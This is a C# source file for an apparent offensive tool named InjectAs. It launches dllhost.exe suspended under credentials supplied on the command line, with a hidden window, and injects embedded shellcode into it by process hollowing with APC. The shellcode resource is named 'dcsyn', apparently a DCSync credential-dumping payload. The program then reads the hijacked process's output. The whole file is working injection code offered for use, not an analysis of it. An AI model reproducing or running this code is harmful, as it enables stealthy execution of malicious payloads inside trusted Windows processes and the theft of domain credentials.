using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using WinAPI;
using WinAPI.Wrapper;

namespace InjectAs
{
    internal class Program
    {
        public static string GetRunningExeName()
        {
            string processName = Process.GetCurrentProcess().MainModule.FileName;
            string exeName = System.IO.Path.GetFileName(processName);
            return exeName;
        }

        static void Main(string[] args)
        {
            //APIWrapper.Config.PreferedAccessType = WinAPI.Wrapper.APIAccessType.DInvoke;
            APIWrapper.Config.PreferedAccessType = WinAPI.Wrapper.APIAccessType.PInvoke;
            //APIWrapper.Config.PreferedInjectionMethod = WinAPI.Wrapper.InjectionMethod.CreateRemoteThread;
            APIWrapper.Config.PreferedInjectionMethod = WinAPI.Wrapper.InjectionMethod.ProcessHollowingWithAPC;

            string cmd = @"c:\windows\system32\dllhost.exe";
            //byte[] shellcode = Properties.Resources.Payload;
            byte[] shellcode = Properties.Resources.dcsyn;
            string domain = null;
            string username = null;
            string password = null;
            ProcessCreationResult procResult = null;

            try
            {
                if (args.Length != 2)
                {
                    Console.WriteLine($"Usage: {GetRunningExeName()} domain\\username password");
                    return;
                }
                else
                {
                    string usr = args[0];
                    if (!usr.Contains('\\'))
                        username = usr;
                    else
                    {
                        var tab = usr.Split('\\');
                        domain = tab[0];
                        username = tab[1];
                    }
                    password = args[1];
                }

                Console.WriteLine($"[?] WinAPIAccess = {APIWrapper.Config.PreferedAccessType}");
                Console.WriteLine($"[?] InjectionMethod = {APIWrapper.Config.PreferedInjectionMethod}");

                var credentials = new ProcessCredentials()
                {
                    Username = username,
                    Password = password,
                    Domain = domain,
                };

                var creationParms = new ProcessCreationParameters()
                {
                    Command = cmd,
                    RedirectOutput = true,
                    CreateNoWindow = true,
                    CreateSuspended = true,
                    Credentials = credentials
                };




                procResult = APIWrapper.CreateProcess(creationParms);

                Console.WriteLine($"[?] ProcessId = {procResult.ProcessId}");
                Console.WriteLine($"[?] ProcessHandle = {procResult.ProcessHandle}");
                Console.WriteLine($"[?] PipeHandle = {procResult.OutPipeHandle}");

                APIWrapper.Inject(procResult.ProcessHandle, procResult.ThreadHandle, shellcode);

                if (procResult.ProcessId != 0 && creationParms.RedirectOutput)
                {
                    var process = Process.GetProcessById(procResult.ProcessId);
                    Console.WriteLine("[+] Result :");
                    APIWrapper.ReadPipeToEnd(procResult.OutPipeHandle, output => Console.Write(output));
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Oooops something went wrong....");
                Console.WriteLine(ex.ToString());
            }
            finally
            {
                if (procResult != null)
                {
                    APIWrapper.CloseHandle(procResult.ProcessHandle);
                    APIWrapper.CloseHandle(procResult.ThreadHandle);
                    APIWrapper.CloseHandle(procResult.OutPipeHandle);
                    APIWrapper.KillProcess(procResult.ProcessId);
                }
            }
        }
    }
}
